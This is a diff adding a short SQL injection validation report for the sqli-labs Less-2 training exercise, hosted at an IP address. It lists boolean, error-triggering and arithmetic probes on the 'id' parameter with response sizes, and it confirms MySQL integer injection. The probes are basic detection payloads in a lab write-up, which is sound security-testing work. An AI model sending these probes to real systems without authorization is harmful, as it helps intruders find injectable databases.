@@ -1,0 +1,60 @@
+SQL Injection Validation Report - Less-2 Numeric Injection
+============================================================
+Target: http://154.8.192.137:60000/sqli-labs/Less-2/
+Test Date: 2026-05-22
+Safety Level: authorized_non_destructive
+
+SUMMARY
+-------
+Less-2 at http://154.8.192.137:60000/sqli-labs/Less-2/ is vulnerable to integer-based SQL injection via GET parameter 'id'.
+
+Evidence Details
+----------------
+
+1. BASELINE RESPONSE
+   Request: GET /sqli-labs/Less-2/?id=1 HTTP/1.1
+   Response: HTTP 200, 721 bytes
+   Status: Normal response with user data displayed
+
+2. BOOLEAN DIFFERENTIAL PROBES
+   Request: GET /sqli-labs/Less-2/?id=1 AND 1=1
+   Response: HTTP 200, 721 bytes (identical to baseline - true condition)
+   
+   Request: GET /sqli-labs/Less-2/?id=1 AND 1=2
+   Response: HTTP 200, 670 bytes (empty/different response - false condition)
+   
+   DIFFERENTIAL: 51 bytes between true/false conditions
+   CONCLUSION: Boolean-based SQL injection confirmed
+
+3. ERROR-BASED PROBE
+   Request: GET /sqli-labs/Less-2/?id=1'
+   Response: HTTP 200, 827 bytes
+   Error Message: "syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1"
+   CONCLUSION: Error-based SQL injection confirmed, MySQL backend revealed
+
+4. ARITHMETIC EVALUATION
+   Request: GET /sqli-labs/Less-2/?id=1-0
+   Response: HTTP 200, 721 bytes (identical to baseline)
+   CONCLUSION: SQL backend evaluates numeric expressions, confirming integer parameter handling
+
+Vulnerability Classification
+----------------------------
+- Type: Integer-based SQL Injection
+- Backend: MySQL
+- Parameter: id (GET)
+- Injection Techniques: Boolean-based, Error-based
+- Severity: High
+
+Non-destructive Validation
+-------------------------
+All probes were read-only HTTP GET requests.
+No data modification or destructive actions performed.
+Evidence captured within authorized scope.
+
+Payload Log
+-----------
+[id=1] Baseline - 721 bytes
+[id=1 AND 1=1] Boolean true - 721 bytes
+[id=1 AND 1=2] Boolean false - 670 bytes (differential detected)
+[id=1'] Error trigger - 827 bytes (SQL error exposed)
+[id=1-0] Arithmetic - 721 bytes (SQL evaluation confirmed)
